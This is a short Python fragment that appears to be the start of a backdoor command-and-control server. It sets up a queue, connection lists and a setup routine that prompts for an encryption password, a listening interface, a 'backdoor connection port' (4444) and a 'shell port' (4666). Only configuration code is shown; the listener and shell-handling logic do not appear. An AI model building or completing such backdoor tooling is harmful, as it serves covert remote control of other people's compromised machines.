import getpass
from queue import Queue


n_threads = 2
jobs = [1, 2]
queue = Queue()

addrs = []
cons = []

KEY = ""

ip_addr = "0.0.0.0"
port = 4444
shell_port = 4666


def setup():
    global KEY, ip_addr, port, shell_port
    key = getpass.getpass("Encryption password: ")
    if len(key) < 1:
        print("Password must be set")
        exit(0)
    KEY = bytes(key, 'utf-8')
    ip_addr = input("Enter inet interface [0.0.0.0]: ")
    if ip_addr == "":
        ip_addr = "0.0.0.0"
    port = input("Enter backdoor connection port [4444]: ")
    if port == "" or int(port) == 4444:
        port = 4444
    else:
        try:
            port = int(port)
        except:
            print("Invalid port type, must be integer")
            exit(0)
    shell_port = input("Enter shell port [4666]: ")
    if shell_port == "" or int(shell_port) == 4666:
        shell_port = 4666
    else:
        try:
            shell_port = int(shell_port)
        except:
            print("Invalid port type, must be integer")
            exit(0)

    
